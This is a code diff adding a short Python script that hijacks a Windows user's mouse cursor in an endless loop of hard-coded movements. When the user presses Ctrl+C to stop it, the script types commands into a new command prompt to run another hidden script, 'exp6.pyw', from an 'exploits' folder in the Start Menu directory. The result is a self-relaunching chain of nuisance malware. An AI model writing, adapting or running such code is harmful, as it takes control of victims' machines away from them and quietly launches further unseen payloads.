@@ -1,0 +1,27 @@
+import pyautogui as pg
+try:    
+    while True:
+        pg.moveTo(100,500)
+        pg.moveTo(190,160)
+        pg.moveTo(230,120)
+        pg.moveTo(410,370)
+        pg.moveTo(510,180)
+        pg.moveTo(420,500)
+        pg.moveTo(316,267)
+        pg.moveTo(380,160)
+        pg.moveTo(470,450)
+        pg.moveTo(295,430)
+        pg.moveTo(130,270)
+        pg.moveTo(371,390)
+        pg.moveTo(3210,260)
+        pg.moveTo(156,140)
+except KeyboardInterrupt:
+    pg.hotkey('win','r')
+    pg.write('cmd')
+    pg.press('enter')
+    pg.write('C:')
+    pg.press('enter')
+    pg.write('cd "%UserProfile%\AppData\Roaming\Microsoft\Windows\Start Menu\exploits"')
+    pg.press('enter')
+    pg.write('python exp6.pyw')
+    pg.press('enter')
